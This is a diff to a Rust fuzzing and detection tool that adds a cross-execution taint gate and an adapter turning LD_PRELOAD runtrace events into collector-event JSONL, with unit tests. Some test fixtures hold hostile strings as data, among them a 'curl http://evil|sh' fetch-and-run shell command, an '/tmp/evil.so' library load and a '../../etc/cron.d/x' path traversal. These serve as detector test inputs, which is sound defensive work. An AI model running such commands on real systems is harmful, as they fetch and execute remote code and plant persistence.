@@ -8,7 +8,7 @@
 use anyhow::{Context, Result};
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
-use std::collections::BTreeMap;
+use std::collections::{BTreeMap, BTreeSet};
 use std::path::Path;
 
 #[derive(Debug, Clone, PartialEq, Eq, std::hash::Hash, Deserialize, Serialize)]
@@ -424,7 +424,11 @@ fn sink_observation(event: &RuntraceEvent) -> Option<(SinkClass, &str, &str, Opt
 /// Fed one execution at a time via [`observe`](Self::observe) (the events are
 /// read per-input from the runtrace stream) and queried once at run end via
 /// [`confirmed`](Self::confirmed).
-#[derive(Debug)]
+///
+/// `Clone` so a caller can snapshot the campaign's accumulated cross-execution
+/// taint evidence (for the runtrace→collector adapter's [`CollectorTaintGate`])
+/// without disturbing the live tracker it keeps folding into.
+#[derive(Debug, Clone)]
 pub struct SinkTaintTracker {
     entries: BTreeMap<(SinkClass, String), SinkStat>,
     dropped_entries: usize,
@@ -566,6 +570,69 @@ impl SinkTaintTracker {
 
     pub fn entry_limit(&self) -> usize {
         self.entry_limit
+    }
+
+    /// Snapshot this tracker's cross-execution-confirmed sinks as a
+    /// [`CollectorTaintGate`] for the runtrace→collector adapter. A sink the
+    /// tracker suppressed (reached untainted at least once — a program constant
+    /// echoed into one input, or any hit the #59 path withholds) is absent from
+    /// the gate, so the adapter will never present it as taint-confirmed.
+    pub fn collector_gate(&self) -> CollectorTaintGate {
+        CollectorTaintGate {
+            confirmed: self
+                .confirmed()
+                .into_iter()
+                .map(|c| (c.class, c.subject))
+                .collect(),
+            subject_bytes: self.subject_bytes,
+        }
+    }
+}
+
+/// Decides whether the runtrace→collector adapter may mark a sink-family event
+/// as taint-confirmed. It is built from the SAME cross-execution correlation /
+/// constant-suppression #59 uses ([`SinkTaintTracker`]): a sink `(class,
+/// subject)` carries taint in the collector stream ONLY when it was
+/// cross-execution-confirmed. This is what stops the adapter from reintroducing
+/// the single-run taint confirmation #59 deliberately withholds — an unconfirmed
+/// single-run hit is emitted as a plain (untainted) collector event and so never
+/// becomes a taint-confirmed finding.
+#[derive(Debug, Clone, Default)]
+pub struct CollectorTaintGate {
+    confirmed: BTreeSet<(SinkClass, String)>,
+    subject_bytes: usize,
+}
+
+impl CollectorTaintGate {
+    /// A gate that confirms nothing: every sink-family event is emitted
+    /// untainted. Used where no cross-execution evidence exists at all.
+    pub fn empty() -> Self {
+        CollectorTaintGate {
+            confirmed: BTreeSet::new(),
+            subject_bytes: 0,
+        }
+    }
+
+    /// Build a gate by correlating a run's runtrace events through the #59
+    /// tracker — used where no live campaign tracker is in hand (e.g. `bhf fuzz`
+    /// reading the aggregated `runtrace.jsonl`, whose lines span every
+    /// execution). The tracker's never-untainted suppression therefore applies
+    /// across the whole run, not per single event.
+    pub fn from_events(events: &[RuntraceEvent]) -> Self {
+        let mut tracker = SinkTaintTracker::default();
+        tracker.observe(events, &[]);
+        tracker.collector_gate()
+    }
+
+    /// The confirmed taint offset for one sink-family event, or `None` when the
+    /// event is not a sink, carried no taint this run, or its `(class, subject)`
+    /// was not cross-execution-confirmed. `None` makes the adapter emit the event
+    /// untainted (the plain oracle variant), so it is never taint-confirmed.
+    fn confirmed_taint(&self, event: &RuntraceEvent) -> Option<u32> {
+        let (class, _api, subject, taint) = sink_observation(event)?;
+        let offset = taint?;
+        let key = (class, bounded_sink_subject(subject, self.subject_bytes));
+        self.confirmed.contains(&key).then_some(offset)
     }
 }
 
@@ -1201,6 +1268,185 @@ fn format_assertion_source(file: &str, line: Option<i64>, function: &str) -> Str
         (false, None, true) => file.to_owned(),
         (false, None, false) => format!("{file}:{function}"),
     }
+}
+
+// ---------------------------------------------------------------------------
+// #60: runtrace → bhf.collector-event.v1 adapter (Linux `--collector auto`).
+//
+// The LD_PRELOAD runtrace shim already observes a target's process / file /
+// library / network effects and tags them with byte-origin taint. The collector
+// contract (`runtime_collector`) is the platform-neutral superset of that
+// vocabulary, so the Linux built-in collector provider is simply an adapter: it
+// re-expresses the SAME shim events as `bhf.collector-event.v1` so the collector
+// pipeline (attribution + oracle registry + provenance + stored evidence) runs
+// over them exactly as it would over a native Windows ETW stream. This is an
+// additional, collector-shaped view; it does not change `--runtime-oracles`.
+// ---------------------------------------------------------------------------
+
+/// Context a lane hands the runtrace→collector adapter for one observation.
+#[derive(Debug, Clone)]
+pub struct CollectorAdapterCtx {
+    pub testcase: String,
+    pub worker: u32,
+    /// Synthetic root pid for the observed target. The runtrace JSONL does not
+    /// carry per-event pids (effects by LD_PRELOAD-inherited descendants land in
+    /// the same stream), so every event is attributed to this single root.
+    pub root_pid: u32,
+}
+
+/// Map one runtrace event to a collector event. For sink families, taint
+/// (`input_derived` / `taint_offset`) is carried through ONLY when `gate`
+/// cross-execution-confirmed the `(class, subject)` — the SAME
+/// correlation/constant-suppression #59 uses — so a single run's raw
+/// `taint_offset` never confirms a sink here. An unconfirmed sink is emitted as
+/// a plain (untainted) collector event, which the oracle layer maps to the
+/// non-taint variant and therefore never reports as a taint-confirmed finding.
+///
+/// Returns `None` for runtrace families with no collector event family (env
+/// lookups, path-checks, format strings, runtime checks, fd closes, SQL — the
+/// last has no collector kind in v1).
+pub fn to_collector_event(
+    event: &RuntraceEvent,
+    ctx: &CollectorAdapterCtx,
+    seq: u64,
+    ts: f64,
+    gate: &CollectorTaintGate,
+) -> Option<runtime_collector::CollectorEvent> {
+    use runtime_collector::schema::{EventKind, EventPhase, ProcessIdentity};
+    use runtime_collector::CollectorEvent;
+
+    // (kind, path, image, address)
+    enum Shape<'a> {
+        /// A process/command execution; the command text goes in `image`.
+        Command(&'a str),
+        /// A library/module load.
+        Library(&'a str),
+        /// A file operation of the given kind on `path`.
+        File(EventKind, &'a str),
+        /// A network egress to `address`.
+        Network(&'a str),
+    }
+
+    let shape = match event {
+        RuntraceEvent::ProcessExec { program, .. } => Shape::Command(program),
+        RuntraceEvent::CommandExecuted { command, .. } => Shape::Command(command),
+        RuntraceEvent::LibraryLoad { library, .. } => Shape::Library(library),
+        RuntraceEvent::DlopenFailed { library } => Shape::Library(library),
+        RuntraceEvent::DestructiveFsOp { path, .. } => Shape::File(EventKind::FileDelete, path),
+        RuntraceEvent::FileDeleted { path, .. } => Shape::File(EventKind::FileDelete, path),
+        RuntraceEvent::FileOpened { path, .. } => Shape::File(EventKind::FileOpen, path),
+        RuntraceEvent::FileMissing { path, .. } => Shape::File(EventKind::FileOpen, path),
+        RuntraceEvent::NetworkEgress { address, .. } => Shape::Network(address),
+        RuntraceEvent::NetworkUnreachable { address, .. } => Shape::Network(address),
+        // No collector event family in v1.
+        RuntraceEvent::EnvVarMissing { .. }
+        | RuntraceEvent::EnvVarAccess { .. }
+        | RuntraceEvent::PathChecked { .. }
+        | RuntraceEvent::FileClosed { .. }
+        | RuntraceEvent::InsecurePermissions { .. }
+        | RuntraceEvent::InsecureTempFile { .. }
+        | RuntraceEvent::FormatString { .. }
+        | RuntraceEvent::RuntimeCheck { .. }
+        | RuntraceEvent::SqlQuery { .. }
+        | RuntraceEvent::Unknown { .. } => return None,
+    };
+
+    // The ONLY source of taint for a collector sink: the cross-execution gate.
+    // A single-run `taint_offset` on `event` is never trusted on its own.
+    let taint = gate.confirmed_taint(event);
+
+    let process = ProcessIdentity {
+        pid: ctx.root_pid,
+        ancestor: Some(ctx.root_pid),
+        ..Default::default()
+    };
+    let (kind, path, image, address) = match shape {
+        Shape::Command(cmd) => (EventKind::ProcessCreate, None, Some(cmd.to_owned()), None),
+        Shape::Library(lib) => (EventKind::ModuleLoad, Some(lib.to_owned()), None, None),
+        Shape::File(kind, path) => (kind, Some(path.to_owned()), None, None),
+        Shape::Network(addr) => (EventKind::Network, None, None, Some(addr.to_owned())),
+    };
+
+    let mut ev = CollectorEvent::new(&ctx.testcase, ctx.worker, seq, EventPhase::Event, kind);
+    ev.process = process;
+    ev.path = path;
+    if let Some(image) = image {
+        ev.process.image = Some(image);
+    }
+    ev.address = address;
+    ev.input_derived = taint.is_some();
+    ev.taint_offset = taint;
+    ev.evidence_ref = Some(format!("runtrace:{seq}"));
+    ev.ts = Some(ts);
+    Some(ev)
+}
+
+/// Render a run's runtrace events as a `bhf.collector-event.v1` JSONL session:
+/// a `begin` boundary for the target root, one `event` per mappable runtrace
+/// event, and an `end` boundary. This is the Linux `--collector auto` stream,
+/// built from the SAME shim events the #59 oracles consume.
+///
+/// `gate` is the cross-execution taint gate (see [`CollectorTaintGate`]): sink
+/// families are taint-confirmed in the emitted stream only when the gate
+/// confirmed them, so this view never single-run-confirms a sink the #59 path
+/// would withhold.
+pub fn collector_jsonl_from_events(
+    events: &[RuntraceEvent],
+    ctx: &CollectorAdapterCtx,
+    root_image: &str,
+    gate: &CollectorTaintGate,
+) -> String {
+    use runtime_collector::schema::{EventKind, EventPhase, ProcessIdentity};
+    use runtime_collector::CollectorEvent;
+
+    let mut out = String::new();
+    let mut seq = 0u64;
+
+    let mut begin = CollectorEvent::new(
+        &ctx.testcase,
+        ctx.worker,
+        seq,
+        EventPhase::Begin,
+        EventKind::ProcessCreate,
+    );
+    begin.process = ProcessIdentity {
+        pid: ctx.root_pid,
+        image: Some(root_image.to_owned()),
+        ..Default::default()
+    };
+    begin.ts = Some(0.0);
+    out.push_str(&begin.to_jsonl_line());
+    out.push('\n');
+
+    let mut last_ts = 0.0;
+    for event in events {
+        seq += 1;
+        let ts = seq as f64;
+        if let Some(ev) = to_collector_event(event, ctx, seq, ts, gate) {
+            out.push_str(&ev.to_jsonl_line());
+            out.push('\n');
+            last_ts = ts;
+        }
+    }
+
+    seq += 1;
+    let mut end = CollectorEvent::new(
+        &ctx.testcase,
+        ctx.worker,
+        seq,
+        EventPhase::End,
+        EventKind::ProcessCreate,
+    );
+    end.process = ProcessIdentity {
+        pid: ctx.root_pid,
+        ..Default::default()
+    };
+    // Close at the last observed effect so host-side attribution retains every
+    // in-window event (the window is applied relative to this boundary).
+    end.ts = Some(last_ts);
+    out.push_str(&end.to_jsonl_line());
+    out.push('\n');
+    out
 }
 
 #[cfg(test)]
@@ -2423,5 +2669,281 @@ mod tests {
         assert_eq!(hits[0].rule_id, "BHF-414");
         assert_eq!(hits[0].api, "unlink");
         assert_eq!(hits[0].evidence_value("path"), Some("../state/session.db"));
+    }
+
+    // --- #60: runtrace → collector adapter ---
+
+    fn adapter_ctx() -> CollectorAdapterCtx {
+        CollectorAdapterCtx {
+            testcase: "tc".to_owned(),
+            worker: 0,
+            root_pid: 1,
+        }
+    }
+
+    #[test]
+    fn collector_adapter_maps_representative_kinds_and_carries_taint() {
+        use runtime_collector::schema::EventKind;
+        let ctx = adapter_ctx();
+
+        // The adapter only taints a sink the cross-execution gate confirmed. Here
+        // every sink is tainted and never seen untainted, so a gate built from the
+        // run's events confirms them (the single-event `taint_offset` alone would
+        // NOT — see `collector_adapter_single_run_taint_is_not_confirmed`).
+        let events = vec![
+            RuntraceEvent::ProcessExec {
+                api: "execve".to_owned(),
+                program: "/bin/sh -c pwned".to_owned(),
+                taint_offset: Some(3),
+            },
+            RuntraceEvent::LibraryLoad {
+                api: "dlopen".to_owned(),
+                library: "/tmp/evil.so".to_owned(),
+                taint_offset: Some(0),
+            },
+            RuntraceEvent::FileOpened {
+                syscall: "openat".to_owned(),
+                fd: 5,
+                path: "/srv/x".to_owned(),
+                taint_offset: None,
+            },
+            RuntraceEvent::DestructiveFsOp {
+                api: "unlink".to_owned(),
+                path: "/srv/victim".to_owned(),
+                taint_offset: Some(7),
+            },
+            RuntraceEvent::NetworkEgress {
+                api: "connect".to_owned(),
+                address: "10.0.0.5:80".to_owned(),
+                taint_offset: Some(1),
+            },
+        ];
+        let gate = CollectorTaintGate::from_events(&events);
+
+        let exec = to_collector_event(&events[0], &ctx, 1, 1.0, &gate).unwrap();
+        assert_eq!(exec.kind, EventKind::ProcessCreate);
+        assert_eq!(exec.process.image.as_deref(), Some("/bin/sh -c pwned"));
+        assert!(exec.is_tainted(), "a confirmed input-derived exec carries taint");
+        assert_eq!(exec.taint_offset, Some(3));
+
+        let lib = to_collector_event(&events[1], &ctx, 2, 2.0, &gate).unwrap();
+        assert_eq!(lib.kind, EventKind::ModuleLoad);
+        assert_eq!(lib.path.as_deref(), Some("/tmp/evil.so"));
+        assert!(lib.is_tainted());
+
+        let open = to_collector_event(&events[2], &ctx, 3, 3.0, &gate).unwrap();
+        assert_eq!(open.kind, EventKind::FileOpen);
+        assert!(!open.is_tainted(), "no taint offset => not input-derived");
+
+        let del = to_collector_event(&events[3], &ctx, 4, 4.0, &gate).unwrap();
+        assert_eq!(del.kind, EventKind::FileDelete);
+        assert!(del.is_tainted(), "a confirmed destructive op carries taint");
+
+        let net = to_collector_event(&events[4], &ctx, 5, 5.0, &gate).unwrap();
+        assert_eq!(net.kind, EventKind::Network);
+        assert_eq!(net.address.as_deref(), Some("10.0.0.5:80"));
+        assert!(net.is_tainted());
+
+        // A family with no collector kind maps to None.
+        assert!(to_collector_event(
+            &RuntraceEvent::EnvVarMissing {
+                api: "getenv".to_owned(),
+                name: "HOME".to_owned(),
+            },
+            &ctx,
+            6,
+            6.0,
+            &gate,
+        )
+        .is_none());
+    }
+
+    #[test]
+    fn collector_adapter_single_run_taint_is_not_confirmed() {
+        // #60 regression: a sink seen ONLY once (so its single-run `taint_offset`
+        // is present) with an EMPTY gate — i.e. not cross-execution-confirmed — is
+        // emitted UNTAINTED, exactly as the #59 path withholds a single-run hit.
+        let ctx = adapter_ctx();
+        let exec = RuntraceEvent::ProcessExec {
+            api: "execve".to_owned(),
+            program: "/bin/sh -c id".to_owned(),
+            taint_offset: Some(0),
+        };
+        let ungated = to_collector_event(&exec, &ctx, 1, 1.0, &CollectorTaintGate::empty())
+            .expect("exec maps to a collector event");
+        assert!(
+            !ungated.is_tainted(),
+            "an unconfirmed single-run sink hit must not carry taint"
+        );
+        assert_eq!(ungated.taint_offset, None);
+    }
+
+    #[test]
+    fn collector_adapter_constant_echoed_into_input_is_suppressed() {
+        // #60 regression for the constant-echo FP the #59 never-untainted clause
+        // defends against: a program constant reached BOTH tainted (echoed into one
+        // input) and untainted (on inputs that did not contain it) must be
+        // suppressed — the gate must not confirm it, so the collector view does not
+        // present it as a taint-confirmed finding.
+        let ctx = adapter_ctx();
+        let constant = "/etc/app.conf";
+        let events = vec![
+            // reached untainted (the genuine program constant)
+            RuntraceEvent::FileOpened {
+                syscall: "open".to_owned(),
+                fd: 3,
+                path: constant.to_owned(),
+                taint_offset: None,
+            },
+            // and reached tainted when the fuzzer echoed the constant into an input
+            RuntraceEvent::FileOpened {
+                syscall: "open".to_owned(),
+                fd: 4,
+                path: constant.to_owned(),
+                taint_offset: Some(0),
+            },
+        ];
+        let gate = CollectorTaintGate::from_events(&events);
+        // Even the occurrence that carried taint this run must not be confirmed,
+        // because the same subject was also reached untainted.
+        let tainted_occurrence = to_collector_event(&events[1], &ctx, 1, 1.0, &gate).unwrap();
+        assert!(
+            !tainted_occurrence.is_tainted(),
+            "a subject also seen untainted must be suppressed, never confirmed"
+        );
+    }
+
+    #[test]
+    fn collector_adapter_untainted_matches_oracle_runtime_event() {
+        use finding_rules::oracle_sdk::OracleRuntimeEvent;
+        // For an event with no taint, the collector view maps to the SAME plain
+        // oracle event the existing per-event path produces (faithful superset).
+        let root = "/srv";
+        let runtrace = RuntraceEvent::FileOpened {
+            syscall: "open".to_owned(),
+            fd: 3,
+            path: "/srv/in-root".to_owned(),
+            taint_offset: None,
+        };
+        let direct = oracle_runtime_event(&runtrace).unwrap();
+        let collector_ev =
+            to_collector_event(&runtrace, &adapter_ctx(), 1, 1.0, &CollectorTaintGate::empty())
+                .unwrap();
+        let via_collector = runtime_collector::to_oracle_event(&collector_ev, root).unwrap();
+        match (direct, via_collector) {
+            (
+                OracleRuntimeEvent::FilePath { path: a, .. },
+                OracleRuntimeEvent::FilePath { path: b, .. },
+            ) => assert_eq!(a, b, "same resolved path through either route"),
+            other => panic!("expected FilePath on both routes, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn collector_jsonl_three_positive_classes_fire_registry_fixed_do_not() {
+        use finding_rules::oracle_registry::ORACLE_REGISTRY;
+        use runtime_collector::{attribute, to_oracle_event, CollectorSessionSet};
+
+        let root = "/srv/sandbox";
+        let ctx = adapter_ctx();
+
+        let fire = |events: &[RuntraceEvent]| -> Vec<String> {
+            // Route through the cross-execution gate, as production does.
+            let gate = CollectorTaintGate::from_events(events);
+            let jsonl = collector_jsonl_from_events(events, &ctx, "/srv/sandbox/target", &gate);
+            let set = CollectorSessionSet::from_jsonl(&jsonl);
+            let session = set.session("tc", 0).expect("session present");
+            let attributed = attribute(session, 250);
+            let mut names = Vec::new();
+            for ev in &attributed.attributed {
+                if let Some(oracle_ev) = to_oracle_event(ev, root) {
+                    for oracle in ORACLE_REGISTRY.iter() {
+                        if let Some(hit) = oracle.evaluate(&oracle_ev) {
+                            names.push(hit.oracle_name);
+                        }
+                    }
+                }
+            }
+            names
+        };
+
+        // Three fuzz-controlled (input-derived) sinks: exec, path, library.
+        let positive = fire(&[
+            RuntraceEvent::ProcessExec {
+                api: "execve".to_owned(),
+                program: "/bin/sh -c curl http://evil|sh".to_owned(),
+                taint_offset: Some(0),
+            },
+            RuntraceEvent::FileOpened {
+                syscall: "open".to_owned(),
+                fd: 4,
+                path: "../../etc/cron.d/x".to_owned(),
+                taint_offset: Some(2),
+            },
+            RuntraceEvent::LibraryLoad {
+                api: "dlopen".to_owned(),
+                library: "/tmp/evil.so".to_owned(),
+                taint_offset: Some(5),
+            },
+        ]);
+        assert!(positive.iter().any(|n| n == "command-controlled-runtime"));
+        assert!(positive.iter().any(|n| n == "path-controlled-open-runtime"));
+        assert!(positive
+            .iter()
+            .any(|n| n == "library-load-controlled-runtime"));
+
+        // The same shapes as fixed constants (no taint) must not confirm.
+        let negative = fire(&[
+            RuntraceEvent::ProcessExec {
+                api: "execve".to_owned(),
+                program: "/bin/ls".to_owned(),
+                taint_offset: None,
+            },
+            RuntraceEvent::FileOpened {
+                syscall: "open".to_owned(),
+                fd: 4,
+                path: "/srv/sandbox/data".to_owned(),
+                taint_offset: None,
+            },
+            RuntraceEvent::LibraryLoad {
+                api: "dlopen".to_owned(),
+                library: "/usr/lib/libc.so.6".to_owned(),
+                taint_offset: None,
+            },
+        ]);
+        for taint_oracle in [
+            "command-controlled-runtime",
+            "path-controlled-open-runtime",
+            "library-load-controlled-runtime",
+        ] {
+            assert!(
+                !negative.iter().any(|n| n == taint_oracle),
+                "fixed constant must not confirm {taint_oracle}"
+            );
+        }
+    }
+
+    #[test]
+    fn collector_jsonl_is_well_formed_with_begin_and_end() {
+        use runtime_collector::schema::EventPhase;
+        use runtime_collector::CollectorSessionSet;
+        let jsonl = collector_jsonl_from_events(
+            &[RuntraceEvent::FileOpened {
+                syscall: "open".to_owned(),
+                fd: 3,
+                path: "/srv/x".to_owned(),
+                taint_offset: None,
+            }],
+            &adapter_ctx(),
+            "/srv/target",
+            &CollectorTaintGate::empty(),
+        );
+        let set = CollectorSessionSet::from_jsonl(&jsonl);
+        assert_eq!(set.malformed_lines, 0, "every line is valid schema");
+        let session = set.session("tc", 0).unwrap();
+        // begin + 1 event + end
+        assert_eq!(session.events.len(), 3);
+        assert_eq!(session.events.first().unwrap().phase, EventPhase::Begin);
+        assert_eq!(session.events.last().unwrap().phase, EventPhase::End);
     }
 }
